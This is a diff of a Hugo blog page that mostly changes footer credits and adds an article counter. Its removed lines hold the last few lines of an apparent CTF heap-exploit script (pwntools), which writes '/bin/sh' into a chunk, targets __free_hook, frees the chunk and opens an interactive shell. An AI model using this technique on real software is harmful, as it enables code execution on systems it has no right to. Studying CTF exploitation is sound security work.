-</span></span><span class="line"><span class="cl"><span class="n">edit</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="sa">b</span><span class="s1">&#39;/bin/sh</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">freehook</span><span class="p">))</span>
-</span></span><span class="line"><span class="cl"><span class="c1">#gdb.attach(p,&#39;b *$rebase(0x1393)&#39;)</span>
-</span></span><span class="line"><span class="cl"><span class="n">dele</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl"><span class="c1">#gdb.attach(p)</span>
-</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div>
+    
 </section>
 
 
@@ -646,12 +297,62 @@
         
             2025 - 
         
-        2026 chang
+        2026 FuGuang&#39;s Bolg
     </section>
     
     <section class="powerby">
         
-        使用 <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> 构建 <br />
+        
+
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        共生产 19 篇文章，约 37.53k 字使用 <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> 构建 <br />
         主题 <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.30.0">Stack</a></b> 由 <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a> 设计
     </section>
 </footer>
